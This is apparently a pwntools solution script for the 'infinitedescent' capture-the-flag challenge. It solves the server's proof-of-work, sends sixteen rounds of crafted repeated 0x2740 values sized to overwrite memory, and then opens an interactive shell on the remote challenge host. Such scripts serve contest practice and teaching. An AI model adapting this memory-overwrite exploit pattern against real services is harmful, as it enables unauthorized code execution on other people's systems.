#!/usr/bin/env python3
from pwn import *
import kctfpow

context.log_level = 'debug'

if args.LOCAL:
    elf = './run.sh'
    io = process([elf], stdin=PTY)
else:
    io = remote('infinitedescent.chal.irisc.tf', 10002)
    io.recvuntil(b'kctf-pow) solve ')
    pow_challenge = io.recvuntil(b'\n').decode()
    pow_solution = kctfpow.solve_challenge(pow_challenge)
    io.recvuntil(b'Solution? ')
    io.send((pow_solution + '\n').encode())


def payload(size):
    payload = p32(0x2740) * (size // 4)
    return payload

for i in range(16):
   payload_size = 4096
   if i == 15:
       payload_size -= 0x390 + 0x70
   io.recvuntil("How many characters do you write in the ground (up to 4096)? Send exactly 4 digits and the newline.")

   io.sendline(str(payload_size).encode("utf-8").rjust(4, b'0'))
   io.recvuntil("Send n characters and the newline.")
   io.sendline(payload(payload_size))

io.recvuntil("How many characters do you write in the ground (up to 4096)? Send exactly 4 digits and the newline.")
io.sendline(b'0000')


io.interactive()
